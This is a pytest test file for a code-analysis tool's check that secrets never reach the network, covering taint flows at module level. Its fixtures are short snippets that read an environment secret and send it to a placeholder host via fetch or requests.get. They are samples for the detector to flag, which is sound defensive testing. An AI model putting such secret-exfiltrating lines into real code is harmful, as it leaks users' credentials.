# SPDX-License-Identifier: AGPL-3.0-or-later
"""Module-level code is walked under the file pseudo-symbol (WI-nilir).

A call at module scope is anchored on the file pseudo-symbol
(``python:app.py:1-1:file:file``), and no DDG covered the module body, so a
flow there was decided by call-graph reachability alone: ``k =
os.environ["K"]; print(len(k)); requests.get(u)`` read ``violated`` at module
level while the same three lines in a function were refuted by the walk.

The module body is now walked as one more function, keyed by the file id. A
top-level ``def`` / ``class`` is a nested function of it: a region that may
run, never a statement in sequence, so a class attribute cannot kill the module
name it shadows. Module names are globals, so a top-level function defined
BEFORE the secret is read can still carry it (WI-lokok's late edges); the
guard below keeps that flow reported.
"""
from __future__ import annotations

import contextlib
import io
import json
from pathlib import Path
from typing import Any

import pytest

from hypergumbo_core.cli import main

_CLAIMS = '''claims:
  - id: SECRET-NET
    text: Secrets never reach the network.
    constraint:
      taint_flow:
        source_taint: host_secret
        prohibited_sink_zone: network
'''


def _evidence(tmp_path: Path, files: dict[str, str]) -> list[tuple[str, str]]:
    """Run the shipped CLI; the SECRET-NET evidence as (method, walk verdict)."""
    repo = tmp_path / "repo"
    repo.mkdir(parents=True)
    for name, text in files.items():
        (repo / name).write_text(text)
    claims = tmp_path / "claims.yaml"
    claims.write_text(_CLAIMS)
    mp = pytest.MonkeyPatch()
    mp.setenv("XDG_CACHE_HOME", str(tmp_path / "cache"))
    buf = io.StringIO()
    try:
        with contextlib.redirect_stdout(buf), \
                contextlib.redirect_stderr(io.StringIO()):
            main(["verify-claims", str(repo), "--claims", str(claims),
                  "--format", "json"])
    finally:
        mp.undo()
    verdict = {v["claim_id"]: v for v in json.loads(buf.getvalue())["verdicts"]}["SECRET-NET"]
    return [(e["analysis_method"], e["walk_verdict"]) for e in verdict.get("evidence", [])]


@pytest.mark.parametrize("name,text", [
    ("app.js", 'const k = process.env.K;\nfetch("http://x/" + k);\n'),
    ("app.ts", 'const k: string = process.env.K ?? "";\nfetch("http://x/" + k);\n'),
    ("app.py", 'import os\nimport requests\nk = os.environ["K"]\nrequests.get("http://x/" + k)\n'),
])
def test_a_module_level_flow_is_confirmed_by_the_walk(tmp_path: Path, name: str, text: str) -> None:
    assert _evidence(tmp_path, {name: text}) == [("ddg", "confirmed")]


def test_a_module_level_secret_that_dies_is_removed_as_in_a_function(tmp_path: Path) -> None:
    """The filed comparison: these lines in a function were already refuted."""
    text = 'const u = "http://x/";\nconst k = process.env.K;\nconsole.log(k.length);\nfetch(u);\n'
    assert _evidence(tmp_path, {"app.js": text}) == []


def test_a_top_level_function_defined_before_the_secret_still_carries_it(tmp_path: Path) -> None:
    """``setup`` reads the global ``K`` when it runs, after ``K`` is read."""
    text = (
        "import os\n"
        "import requests\n"
        "URL = 'http://x/'\n"
        "def setup():\n"
        "    global URL\n"
        "    URL = URL + K\n"
        "K = os.environ['K']\n"
        "n = len(K)\n"
        "setup()\n"
        "requests.get(URL)\n"
    )
    assert _evidence(tmp_path, {"app.py": text}) in ([("ddg", "confirmed")], [("ddg_mixed", "escaped")])


def test_a_class_attribute_does_not_kill_the_module_name_it_shadows(tmp_path: Path) -> None:
    text = (
        "import os\n"
        "import requests\n"
        "u = os.environ['K']\n"
        "class C:\n"
        "    u = 'http://x/'\n"
        "requests.get(u)\n"
    )
    assert _evidence(tmp_path, {"app.py": text}) == [("ddg", "confirmed")]


def test_only_a_module_with_a_call_outside_its_definitions_is_walked() -> None:
    """A library file of defs and imports has no file-anchored call to adjudicate;
    a language whose mapping names no call types cannot be asked, and is walked."""
    import tree_sitter
    from tree_sitter_language_pack import get_language

    from hypergumbo_core.cfg import load_cfg_mapping
    from hypergumbo_core.ddg_build import _has_module_call

    parser = tree_sitter.Parser(get_language("python"))
    mapping = load_cfg_mapping("python")
    assert mapping is not None

    def root(src: str) -> Any:
        return parser.parse(src.encode()).root_node

    assert not _has_module_call(root("import os\ndef f():\n    os.getenv('K')\n"), mapping)
    assert _has_module_call(root("import os\nK = os.getenv('K')\n"), mapping)
    blind = type("M", (), {"call_node_types": [], "get_nested_function": mapping.get_nested_function})()
    assert _has_module_call(root("def f():\n    pass\n"), blind)
